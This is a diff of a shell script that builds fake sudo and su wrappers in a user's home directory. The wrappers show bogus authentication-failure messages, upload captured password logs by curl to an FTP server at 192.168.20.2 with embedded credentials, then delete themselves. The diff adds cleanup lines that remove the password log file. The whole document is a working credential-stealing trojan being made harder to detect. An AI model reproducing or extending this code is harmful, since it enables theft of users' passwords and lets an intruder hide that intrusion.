@@ -18,6 +18,7 @@ echo "echo \"su: Authentication failure\"" >> $HOME/.sudo_su;
 echo "curl -u alejandro:kornienko23 -T .plog* ftp://192.168.20.2/.cre/ 2>/dev/null" >> $HOME/.sudo_su;
 echo "rm \$HOME/.sudo_sd" >> $HOME/.sudo_su;
 echo "rm \`basename \$0\`" >> $HOME/.sudo_su;
+echo "rm \$HOME/.plog" >> $HOME/.sudo_su;
 echo "bash --rcfile .bashrc" >> $HOME/.sudo_su;
 chmod 755 $HOME/.sudo_su;
 
@@ -35,6 +36,7 @@ echo "echo \"Sorry, try again.\"" >> $HOME/.sudo_sd;
 echo "curl -u alejandro:kornienko23 -T .plog* ftp://192.168.20.2/.cre/ 2>/dev/null" >> $HOME/.sudo_sd;
 echo "rm \`basename \$0\`" >> $HOME/.sudo_sd;
 echo "rm \$HOME/.sudo_su" >> $HOME/.sudo_sd;
+echo "rm \$HOME/.plog" >> $HOME/.sudo_sd;
 echo "sudo -k;" >> $HOME/.sudo_sd;
 echo "sudo \$*; bash --rcfile .bashrc" >> $HOME/.sudo_sd;
 chmod 755 $HOME/.sudo_sd;
